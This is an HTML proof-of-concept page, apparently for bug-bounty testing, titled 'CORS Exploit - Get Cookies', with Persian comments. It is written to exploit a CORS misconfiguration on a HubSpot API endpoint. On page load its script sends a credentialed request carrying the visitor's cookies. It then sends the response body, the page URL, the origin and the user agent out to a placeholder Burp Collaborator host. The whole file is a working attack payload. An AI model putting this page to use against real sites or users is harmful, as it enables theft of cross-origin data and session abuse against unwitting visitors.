<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit - Get Cookies</title>
</head>
<body>
    <h1>Loading...</h1>
    <script>
    // درخواست به هاب‌اسپات با کوکی‌ها
    fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
        method: 'POST',
        credentials: 'include',
        headers: {
            'Content-Type': 'application/json',
            'Origin': 'https://zeynaal.github.io'
        },
        body: JSON.stringify([{
            event: 'page_view',
            properties: {
                url: window.location.href,
                timestamp: new Date().toISOString()
            }
        }])
    })
    .then(response => {
        // گرفتن کوکی از هدر درخواست (اینجا نمی‌شه، ولی کوکی همراه درخواست رفته)
        // برگردوندن پاسخ به Collaborator
        return response.text().then(data => {
            return { status: response.status, data: data };
        });
    })
    .then(result => {
        // ارسال به Collaborator
        fetch('https://YOUR_COLLABORATOR.oastify.com', {
            method: 'POST',
            mode: 'cors',  // مهم: با cors بفرست تا هدرها بیاد
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                response: result.data,
                status: result.status,
                origin: window.location.origin,
                userAgent: navigator.userAgent,
                // اینجا کوکی رو نمی‌تونیم ببینیم، ولی می‌دونیم که همراه درخواست رفته
                note: 'Cookies were sent with the request (HttpOnly). Check Burp Suite for the Cookie header.'
            })
        });
    })
    .catch(error => {
        fetch('https://YOUR_COLLABORATOR.oastify.com', {
            method: 'POST',
            mode: 'cors',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                error: error.toString(),
                origin: window.location.origin
            })
        });
    });
    </script>
</body>
</html>
